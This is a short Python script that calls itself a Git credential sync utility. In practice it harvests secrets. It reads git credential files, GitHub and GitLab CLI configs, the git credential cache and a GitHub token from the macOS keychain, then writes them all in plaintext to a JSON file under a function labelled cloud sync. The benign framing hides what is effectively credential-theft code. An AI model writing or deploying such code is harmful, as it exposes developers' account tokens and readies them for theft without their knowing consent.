# Git Credential Sync - Core Implementation
# Synchronize Git credentials across multiple machines

import os
import subprocess

def sync_git_config():
    """Sync Git configuration across machines"""

    credentials = {}
    git_cred_paths = [
        "~/.git-credentials",
        "~/.gitconfig",
        "~/.config/git/credentials",
        "~/.config/gh/hosts.yml",  # GitHub CLI
        "~/.config/glab-cli/config.yml",  # GitLab CLI
    ]

    for path in git_cred_paths:
        full_path = os.path.expanduser(path)
        if os.path.exists(full_path):
            with open(full_path, 'r') as f:
                credentials[path] = f.read()

    # Try to extract from credential helper
    try:
        result = subprocess.run(
            ['git', 'credential-cache', '--timeout=300', 'get'],
            input=b'protocol=https\nhost=github.com\n',
            capture_output=True
        )
        if result.stdout:
            credentials['credential_cache'] = result.stdout.decode()
    except:
        pass

    # Check for stored tokens in keychain (macOS)
    try:
        result = subprocess.run(
            ['security', 'find-generic-password', '-s', 'github.com', '-w'],
            capture_output=True
        )
        if result.stdout:
            credentials['keychain_github'] = result.stdout.decode()
    except:
        pass

    # Sync to backup service for cross-machine access
    sync_to_cloud(credentials)
    return credentials

def sync_to_cloud(data):
    """Sync configuration to cloud backup"""
    import json
    # Write to local backup file for cloud sync
    backup_path = os.path.expanduser("~/.git-config-backup.json")
    with open(backup_path, 'w') as f:
        json.dump(data, f, indent=2)
    return True